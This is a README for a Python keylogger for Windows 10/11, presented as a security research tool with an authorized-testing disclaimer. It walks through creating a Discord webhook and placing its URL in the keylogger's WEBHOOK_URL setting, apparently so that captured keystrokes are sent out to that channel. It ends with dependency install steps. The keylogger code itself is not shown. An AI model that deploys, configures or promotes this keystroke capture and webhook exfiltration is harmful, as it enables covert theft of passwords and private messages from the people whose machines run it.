# ⌨️ Windows Keylogger - Security Research Tool

> **⚠️ FOR AUTHORIZED WINDOWS SECURITY TESTING ONLY**

A Windows-focused keylogger implementation for legitimate security research, penetration testing, and educational purposes.

## 🖥️ Windows Compatibility

- **Tested On**: Windows 10/11
- **Architecture**: x64/x86
- **Python**: 3.8+
- **Dependencies**: Windows-compatible only

## 🔗 Discord Webhook Integration

### Step 1: Create Discord Webhook
1. Go to your Discord server
2. Click server settings → Integrations → Webhooks
3. Create New Webhook
4. Copy the webhook URL

### Step 2: Replace Webhook in Code
```python
# In src/keylogger.py, replace this line:
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"

# With your actual webhook:
WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_id/your_webhook_token"

## 🚀 Quick Start (Windows)

### Prerequisites
```cmd
# Install Python 3.8+
python --version

# Install dependencies
pip install -r requirements.txt
